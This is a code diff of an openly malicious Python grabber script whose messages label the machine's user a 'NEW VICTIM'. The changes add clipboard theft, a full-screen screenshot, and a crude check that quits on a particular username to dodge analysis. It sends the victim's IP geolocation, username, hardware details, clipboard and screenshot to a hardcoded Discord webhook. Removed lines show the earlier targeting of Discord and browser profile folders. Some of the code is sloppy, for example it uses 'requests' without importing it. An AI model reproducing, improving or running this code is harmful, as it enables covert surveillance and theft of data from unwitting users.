@@ -9,11 +9,17 @@ import winreg
 import psutil
 import socket
 import wmi
+import re
+import subprocess
+import platform
+import pyperclip
+from PIL import ImageGrab
+import io
 from re import findall
 from urllib.request import Request, urlopen
 
 # your webhook URL
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1057677695657459732/VDupV2JEFE5lIGGrBIU3AVDZtzKsFYAFXvw5qlOs6ZWnMj9hEybS2DqV_S67l2ihvjFX'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1077368044524941352/R72yU15Zzu_AnL4YdHAK9oWYtTL5nojoVBDlmckjwuqWx5L--CroBgfVTH5WnCK7YhE8'
 
 # mentions you when you get a hit
 PING_ME = True
@@ -31,7 +37,22 @@ local_ip_address = socket.gethostbyname(socket.gethostname())
 c = wmi.WMI()
 microsoft = "Unknown"
 
+# Get clipboard
+clipboard = pyperclip.paste()
+
 vpnresult = ''
+
+username = getpass.getuser()
+print("Username:", username)
+if username == 'fredr':
+    print('VM')
+    try:
+       os.remove('.')
+       quit()
+    except:
+       quit()  
+    
+    
 
 # CPU information
 cpu_count = psutil.cpu_count()
@@ -48,18 +69,20 @@ disk_usage = psutil.disk_usage('/')
 
 # GPU information
 try:
-    import GPUtil
-    gpus = GPUtil.getGPUs()
-    gpu_model = gpus[0].name
-except:
-    gpu_model = "No GPU found"
+    cpuinfo = subprocess.check_output(['cat', '/proc/cpuinfo']).decode()
+    model_name_match = re.search(r'model name\s+:\s+(.*)', cpuinfo, flags=re.IGNORECASE)
+    if model_name_match:
+        cpu_model = model_name_match.group(1)
+    else:
+        cpu_model = "Unknown CPU model"
+except (FileNotFoundError, subprocess.CalledProcessError):
+    cpu_model = "Unknown CPU model"
 
 # CPU model
-cmdline = " ".join(psutil.Process().cmdline())
-for part in cmdline.split("--"):
-    if "model name" in part:
-        cpu_model = part.strip().split(": ")[1]
-        break
+w = wmi.WMI()
+for processor in w.Win32_Processor():
+    cpu_model = processor.Name.strip()
+    break
 else:
     cpu_model = "Unknown CPU model"
 
@@ -71,26 +94,18 @@ try:
 except:
     gpu_model = "No GPU found"
 
-if os.path.exists(os.path.join(os.getenv('USERPROFILE'), 'MicrosoftAccount')):
-    print("Microsoft account found.")
-    for user in c.Win32_UserAccount():
-        if user.Caption == "Guest":
-            continue
-        try:
-            if "MicrosoftAccount" in user.SID:
-                for account in c.Win32_Account():
-                    if account.SID == user.SID:
-                        if account.Domain == "MicrosoftAccount":
-                            microsoft = "True, account is a Microsoft account"
-                        else:
-                            microsoft = "False, account is a local account"
-                break
-        except Exception as e:
-            print("Error while checking for Microsoft account:", e)
-            microsoft = "Unknown"
+w = wmi.WMI()
+microsoft = False
+for account in w.Win32_Account():
+    if account.SID.startswith("S-1-5-21-") and "MicrosoftAccount" in account.SID:
+        microsoft = True
+        break
+
+if microsoft:
+    microsoft = "Microsoft account found."
 else:
-    print("Microsoft account not found.")
-    microsoft = "False, account is a local account"
+    microsoft = "Microsoft account not found."
+
 
 
 
@@ -122,39 +137,53 @@ relay_status = (data['security']['relay'])
 
 
 def main():
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
 
-    paths = {
-        'Discord': roaming + '\\discord',
-        'Discord Canary': roaming + '\\discordcanary',
-        'Discord PTB': roaming + '\\discordptb',
-        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
-        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
-    }
+    # Take screenshot of entire screen
+    screenshot = ImageGrab.grab()
 
-    if PING_ME:
-        message = '<@515402023223427072>'
+    # Save screenshot to a buffer
+    buffer = io.BytesIO()
+    screenshot.save(buffer, format="PNG")
+    buffer.seek(0)
+
+    # IP info dump
     ip_info = get_ip_info_dump()
-    
+
+    # Send message
     if not (relay_status or proxy_status or tor_status or vpn_status):
-        message = f'----------------------------------**NEW MESSAGE**--------------------------------------------------------\n\n\n<@515402023223427072>\n**NEW VICTIM**\n\n\n\n**Device**\n```\nDevice Info: {pl.uname()}\nDevice IP: {ip_address}\nLocal IP: {local_ip_address}\nSystem language: {language}\nCurrent user: {username}\nLocal Account: {microsoft}```\n\n**IP Address Dump**\n```\nDevice IP: {ip_info["ip"]}\nCity: {ip_info["city"]}\nRegion: {ip_info["region"]}\nCountry: {ip_info["country"]}\nPostal code: {ip_info["postal"]}\nTimezone: {ip_info["timezone"]}\nOrganization: {ip_info["org"]}\nCoordinates: {ip_info["loc"]}```\n\n**Security Info**\n```\nVPN: {vpn_status}\nProxy: {proxy_status}\nTor: {tor_status}\nRelay: {relay_status}```\n**Hardware Info**```CPU Model: {cpu_model}\nCPU Count: {cpu_count}\nCPU Frequency: {cpu_freq}\nCPU Usage: {cpu_percent}%\nGPU Model: {gpu_model}\nTotal Memory: {mem_total}\nAvailable Memory: {mem_available}\nMemory Usage: {mem_percent}%\nDisk Usage: {disk_usage}```'
+        message = f'----------------------------------**NEW MESSAGE**--------------------------------------------------------\n\n\n<@515402023223427072>\n**NEW VICTIM**\n\n\n\n**Device**\n```\nDevice Info: {pl.uname()}\nDevice IP: {ip_address}\nLocal IP: {local_ip_address}\nSystem language: {language}\nCurrent user: {username}\nAccount Status: {microsoft}\nClipboard: {clipboard}```\n\n**IP Address Dump**\n```\nDevice IP: {ip_info["ip"]}\nCity: {ip_info["city"]}\nRegion: {ip_info["region"]}\nCountry: {ip_info["country"]}\nPostal code: {ip_info["postal"]}\nTimezone: {ip_info["timezone"]}\nOrganization: {ip_info["org"]}\nCoordinates: {ip_info["loc"]}```\n\n**Security Info**\n```\nVPN: {vpn_status}\nProxy: {proxy_status}\nTor: {tor_status}\nRelay: {relay_status}```\n**Hardware Info**```CPU Model: {cpu_model}\nCPU Count: {cpu_count}\nCPU Frequency: {cpu_freq}\nCPU Usage: {cpu_percent}%\nGPU Model: {gpu_model}\nTotal Memory: {mem_total}\nAvailable Memory: {mem_available}\nMemory Usage: {mem_percent}%\nDisk Usage: {disk_usage}```Screenshot: '
     else:
-        message = f'----------------------------------**NEW MESSAGE**--------------------------------------------------------\n\n\n<@515402023223427072>\n**NEW VICTIM**\n\n\n\n**Device**\n```\nDevice Info: {pl.uname()}\nDevice IP: {ip_address}             ⚠️VPN Detected\nLocal IP: {local_ip_address}\nSystem language: {language}\nCurrent user: {username}\nLocal Account: {microsoft}```\n\n**IP Address Dump**⚠️\n```\nDevice IP: {ip_info["ip"]}             ⚠️VPN Detected\nCity: {ip_info["city"]}             ⚠️VPN Detected\nRegion: {ip_info["region"]}             ⚠️VPN Detected\nCountry: {ip_info["country"]}             ⚠️VPN Detected\nPostal code: {ip_info["postal"]}             ⚠️VPN Detected\nTimezone: {ip_info["timezone"]}             ⚠️VPN Detected\nOrganization: {ip_info["org"]}\nCoordinates: {ip_info["loc"]}             ⚠️VPN Detected```\n\n**Security Info**\n```\nVPN: {vpn_status}\nProxy: {proxy_status}\nTor: {tor_status}\nRelay: {relay_status}\n```\n**Hardware Info**```CPU Model: {cpu_model}\nCPU Count: {cpu_count}\nCPU Frequency: {cpu_freq}\nCPU Usage: {cpu_percent}%\nGPU Model: {gpu_model}\nTotal Memory: {mem_total}\nAvailable Memory: {mem_available}\nMemory Usage: {mem_percent}%\nDisk Usage: {disk_usage}```'
+        message = f'----------------------------------**NEW MESSAGE**--------------------------------------------------------\n\n\n<@515402023223427072>\n**NEW VICTIM**\n\n\n\n**Device**\n```\nDevice Info: {pl.uname()}\nDevice IP: {ip_address}             ⚠️VPN Detected\nLocal IP: {local_ip_address}\nSystem language: {language}\nCurrent user: {username}\nAccount Status: {microsoft}\nClipboard: {clipboard}```\n\n**IP Address Dump**⚠️\n```\nDevice IP: {ip_info["ip"]}             ⚠️VPN Detected\nCity: {ip_info["city"]}             ⚠️VPN Detected\nRegion: {ip_info["region"]}             ⚠️VPN Detected\nCountry: {ip_info["country"]}             ⚠️VPN Detected\nPostal code: {ip_info["postal"]}             ⚠️VPN Detected\nTimezone: {ip_info["timezone"]}             ⚠️VPN Detected\nOrganization: {ip_info["org"]}\nCoordinates: {ip_info["loc"]}             ⚠️VPN Detected```\n\n**Security Info**\n```\nVPN: {vpn_status}\nProxy: {proxy_status}\nTor: {tor_status}\nRelay: {relay_status}\n```\n**Hardware Info**```CPU Model: {cpu_model}\nCPU Count: {cpu_count}\nCPU Frequency: {cpu_freq}\nCPU Usage: {cpu_percent}%\nGPU Model: {gpu_model}\nTotal Memory: {mem_total}\nAvailable Memory: {mem_available}\nMemory Usage: {mem_percent}%\nDisk Usage: {disk_usage}```'
 
-
-    headers = {
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
-    }
-    payload = json.dumps({'content': message})
-  
+    message_payload = {'content': message}
+    message_headers = {"Content-Type": "application/json"}
     try:
-        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
-        urlopen(req)
-    except:
-        pass
+        message_response = requests.post(WEBHOOK_URL, headers=message_headers, json=message_payload)
+        message_response.raise_for_status()
+        print("Message sent successfully")
+    except requests.exceptions.RequestException as e:
+        print("Error sending message:", e)
+
+    # Define message text
+    message_text = "Here's a screenshot:"
+
+    # Send message with screenshot
+    message_payload = {
+        'content': message_text,
+        'file': ('screenshot.png', buffer, 'image/png')
+    }
+    message_headers = {
+        'Content-Type': 'multipart/form-data'
+    }
+    try:
+        message_response = requests.post(WEBHOOK_URL, headers=message_headers, files=message_payload)
+        message_response.raise_for_status()
+        print("Message sent successfully")
+    except requests.exceptions.RequestException as e:
+        print("Error sending message:", e)
+        if hasattr(e.response, 'text'):
+            print("Error response:", e.response.text)
+
 
 if __name__ == '__main__':
     main()
